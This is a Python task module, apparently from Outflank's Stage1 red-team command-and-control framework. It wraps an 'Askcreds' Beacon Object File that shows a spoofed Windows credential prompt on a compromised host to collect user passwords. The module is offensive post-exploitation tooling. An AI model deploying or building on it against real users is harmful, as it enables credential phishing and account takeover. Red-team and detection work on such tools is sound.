import argparse
from typing import List, Tuple, Optional

from outflank_stage1.implant import ImplantArch
from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding


class AskCredsBOF(BaseBOFTask):
    def __init__(self):
        super().__init__("Askcreds")

        self.parser.description = (
            "Collect passwords using CredUIPromptForWindowsCredentialsName."
        )

        self.parser.add_argument(
            "reason",
            help="This reason is displayed as part of the prompt (default: Restore Network Connection).",
            nargs=argparse.REMAINDER,
        )

        self.parser.epilog = "Collect passwords by simply asking."

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        parser_arguments = self.parser.parse_args(arguments)

        if parser_arguments.reason is None:
            return []

        return [(BOFArgumentEncoding.WSTR, " ".join(parser_arguments.reason))]

    def run(self, arguments: List[str]):
        self.append_response(
            "Askcreds BOF by Outflank, waiting max 60sec for user input...\n"
        )
        super().run(arguments)
